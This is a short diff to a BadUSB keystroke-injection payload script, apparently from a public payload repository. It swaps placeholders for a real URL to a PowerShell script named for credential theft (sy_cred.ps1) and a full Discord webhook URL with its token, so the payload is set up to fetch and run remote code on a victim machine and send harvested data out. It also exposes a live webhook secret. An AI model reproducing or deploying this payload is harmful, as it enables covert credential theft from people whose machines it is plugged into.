@@ -8,7 +8,7 @@ REM Source: https://github.com/Mr-Proxy-source/BadUSB-Payloads
 
 REM Remember you will have to host the powershell script yourself on any file sharing service (it has to be direct download link)
 REM If you are using DropBox, just remember to change it from ?dl=0 top ?dl=1
-DEFINE #SCRIPT_URL example.com/payload.ps1?dl=1
+DEFINE SCRIPT_URL https://github.com/klamellerklar/Demos/edit/main/sy_cred.ps1
 
 REM If you want to use discord webhook instead of telegram bot, just change DC_WEBHOOK 
 
@@ -17,7 +17,7 @@ DEFINE #BOT_TOKEN your-bot-token
 DEFINE #CHAT_ID your-chat-id
 
 REM Discord webhook
-DEFINE #DC_WEBHOOK your-webhook
+DEFINE DC_WEBHOOK https://discord.com/api/webhooks/1287817527866425384/Ym6YAOqXQVZ8y81A7LnXjEcRp5zEXvRsES0aBsX3dXJRynj6GjblnTlAEFGu6MxHiKIk
 
 DELAY 1500
 GUI r
